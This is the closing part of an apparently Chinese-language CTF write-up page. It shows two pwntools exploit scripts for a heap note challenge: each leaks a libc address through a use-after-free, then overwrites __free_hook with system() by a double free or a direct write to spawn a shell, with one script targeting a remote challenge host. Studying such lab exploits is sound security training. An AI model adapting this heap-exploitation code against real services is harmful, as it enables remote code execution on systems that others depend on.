</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Index: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(idx)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Content: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(content)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>del_note</span>(idx):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;choice: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Index: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(idx)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Leak libc address</span>
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>13</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>read_note(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak_libc <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>8</span>))
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> leak_libc <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1ed0e0</span>
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>free_hook <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1eee48</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leak Libc = </span><span style=color:#e6db74>{</span>hex(leak_libc)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Libc Base = </span><span style=color:#e6db74>{</span>hex(libc_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;System Address = </span><span style=color:#e6db74>{</span>hex(system_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Free Hook = </span><span style=color:#e6db74>{</span>hex(free_hook)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>0x420</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>## Use Double Free to Write system_addr to __free_hook</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0xa</span>):
</span></span><span style=display:flex><span>    add_note(i, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x8</span>):
</span></span><span style=display:flex><span>    del_note(i)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>9</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>### Clean tcache</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x8</span>):
</span></span><span style=display:flex><span>    add_note(i, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>8</span>, p64(free_hook))
</span></span><span style=display:flex><span>bin_sh <span style=color:#f92672>=</span> u64(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>9</span>, p64(bin_sh))
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>11</span>, p64(system_addr))
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>9</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>:::</p><p>:::spoiler Method 2</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./chal&#39;</span>)
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.113.184.121&#39;</span>, <span style=color:#ae81ff>10058</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>add_note</span>(idx, len):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;choice: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Index: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(idx)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Length: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(len)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_note</span>(idx):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;choice: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Index: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(idx)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>write_note</span>(idx, content):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;choice: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Index: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(idx)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Content: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(content)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>del_note</span>(idx):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;choice: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Index: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(idx)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Leak libc address</span>
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>13</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>read_note(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak_libc <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>8</span>))
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> leak_libc <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1ed0e0</span>
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>free_hook <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1eee48</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leak Libc = </span><span style=color:#e6db74>{</span>hex(leak_libc)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Libc Base = </span><span style=color:#e6db74>{</span>hex(libc_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;System Address = </span><span style=color:#e6db74>{</span>hex(system_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Free Hook = </span><span style=color:#e6db74>{</span>hex(free_hook)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>0x420</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>## Another Way to Write system_addr to __free_hook</span>
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>1</span>, p64(free_hook) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>bin_sh <span style=color:#f92672>=</span> u64(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>2</span>, p64(bin_sh))
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>4</span>, p64(system_addr))
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>:::</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a><ul><li><a href=#前置作業-leak-libc-address>前置作業: Leak Libc Address</a></li><li><a href=#方法一-double-fee>方法一: Double Fee</a></li><li><a href=#方法二-一般的寫入>方法二: 一般的寫入</a></li></ul></li><li><a href=#exploit---leak-libcuaf--double-free>Exploit - Leak Libc(UAF) + Double Free(?)</a></li></ul></nav></div></aside></main></body></html>